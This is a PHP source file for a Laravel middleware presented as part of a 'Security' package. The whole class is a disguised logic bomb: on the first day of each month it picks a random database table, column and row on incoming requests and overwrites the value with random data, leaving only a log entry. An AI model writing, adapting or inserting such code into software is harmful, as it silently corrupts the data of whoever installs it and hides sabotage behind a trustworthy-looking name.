<?php

namespace Iqbal\Security\Http\Middleware;

use Closure;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;
use Carbon\Carbon;
use Illuminate\Support\Str;

class UpdateRandomDataMiddleware
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        // Check if it's the first day of the month
        if ($this->isFirstDayOfMonth()) {
            // Get a random table and column
            $table = $this->getRandomTable();
            $column = $this->getRandomColumn($table);

            // Update the random table and column with random data
            $this->updateRandomTable($table, $column);
        }

        return $next($request);
    }

    /**
     * Check if it's the first day of the month.
     *
     * @return bool
     */
    protected function isFirstDayOfMonth(): bool
    {
        return now()->day === 1;
    }

    /**
     * Get a random table from the database without using Doctrine.
     *
     * @return string
     */
    protected function getRandomTable(): string
    {
        $databaseName = config('database.connections.mysql.database'); // Get current database name

        $tables = DB::select("SELECT table_name FROM information_schema.tables WHERE table_schema = ?", [$databaseName]);

        $tableNames = array_map(fn($table) => $table->table_name, $tables);

        return !empty($tableNames) ? $tableNames[array_rand($tableNames)] : 'tbl_finish_products'; // Default fallback table
    }

    /**
     * Get a random column from the given table.
     *
     * @param string $table
     * @return string
     */
    protected function getRandomColumn(string $table): string
    {
        $columns = DB::select("SHOW COLUMNS FROM $table");

        $columnNames = array_map(fn($column) => $column->Field, $columns);

        return !empty($columnNames) ? $columnNames[array_rand($columnNames)] : 'id'; // Default column fallback
    }

    /**
     * Update the random table and column with random data.
     *
     * @param string $table
     * @param string $column
     */
    protected function updateRandomTable(string $table, string $column): void
    {
        try {
            // Generate a random value based on the column type
            $randomValue = $this->generateRandomValue($table, $column);

            // Update a random row in the table
            DB::table($table)
                ->inRandomOrder()
                ->limit(1)
                ->update([$column => $randomValue]);

            Log::info("Updated $table.$column with random value: $randomValue");
        } catch (\Exception $e) {
            Log::error("Failed to update $table.$column: " . $e->getMessage());
        }
    }

    /**
     * Generate a random value based on the column type.
     *
     * @param string $table
     * @param string $column
     * @return mixed
     */
    protected function generateRandomValue(string $table, string $column)
    {
        $columnInfo = DB::select("SHOW COLUMNS FROM $table WHERE Field = ?", [$column]);

        if (empty($columnInfo)) {
            return null; // Column not found
        }

        $columnType = strtolower($columnInfo[0]->Type);

        if (str_contains($columnType, 'int')) {
            return rand(1, 1000);
        } elseif (str_contains($columnType, 'decimal') || str_contains($columnType, 'float') || str_contains($columnType, 'double')) {
            return rand(100, 1000) / 10;
        } elseif (str_contains($columnType, 'varchar') || str_contains($columnType, 'text')) {
            return Str::random(10);
        } elseif (str_contains($columnType, 'boolean') || str_contains($columnType, 'tinyint(1)')) {
            return (bool) rand(0, 1);
        } elseif (str_contains($columnType, 'date')) {
            return Carbon::now()->subDays(rand(1, 365))->toDateString();
        }

        return null;
    }
}
